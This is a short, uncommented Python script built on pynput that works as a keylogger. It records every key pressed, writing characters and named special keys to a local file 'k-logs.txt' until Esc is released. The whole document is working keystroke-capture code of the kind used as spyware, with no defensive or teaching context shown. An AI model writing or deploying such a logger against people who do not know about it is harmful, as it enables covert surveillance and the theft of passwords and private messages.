from pynput.keyboard import Key, Listener

f = "k-logs.txt"

def p(k):
    try:
        with open(f, "a") as file:
            file.write(str(k.char))
    except AttributeError:
        with open(f, "a") as file:
            file.write(f"[{k.name}]")
def r(k):
    if k == Key.esc:
        return False
with Listener(on_press=p, on_release=r) as l:
    l.join()
